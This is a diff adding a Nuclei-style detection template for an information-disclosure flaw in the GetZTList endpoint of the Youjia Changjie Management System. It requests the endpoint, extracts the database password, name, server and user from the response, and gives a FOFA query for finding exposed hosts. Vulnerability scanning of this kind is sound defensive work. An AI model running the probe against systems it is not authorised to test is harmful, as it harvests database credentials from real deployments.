@@ -1,0 +1,58 @@
+id: poc-yaml-youjiasoft-getztlist-info-leak
+info:
+  name: 友加畅捷管理系统 GetZTList 信息泄露漏洞
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: information-disclosure
+  description: |
+    This template detects an information disclosure vulnerability in the Youjia Changjie Management System `GetZTList` endpoint.
+http:
+  - method: GET
+    path:
+      - "/Sysconfig/GetZTList"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"DBName\":"
+          - "Data Source="
+          - "user="
+        part: body
+      - type: word
+        words:
+          - "application/json"
+        part: header
+      - type: regex
+        regex:
+          - "\\\"pwd\\\":\\\"([A-Za-z0-9!@#$%^&*()_+\\-=\\[\\]{};':\\\\\"\\|,.<>\\/?~]+)\\\""
+        part: body
+    extractors:
+      - type: regex
+        name: db_password
+        part: body
+        regex:
+          - "\\\"pwd\\\":\\\"([A-Za-z0-9!@#$%^&*()_+\\-=\\[\\]{};':\\\\\"\\|,.<>\\/?~]+)\\\""
+        group: 1
+      - type: regex
+        name: db_name
+        part: body
+        regex:
+          - "\\\"DBName\\\":\\\"(.*?)\\\""
+        group: 1
+      - type: regex
+        name: data_source
+        part: body
+        regex:
+          - "Data Source=(.*?);"
+        group: 1
+      - type: regex
+        name: user
+        part: body
+        regex:
+          - "user=(.*?);"
+        group: 1
+variables:
+  fofa_query: 'icon_hash="2049187099"'
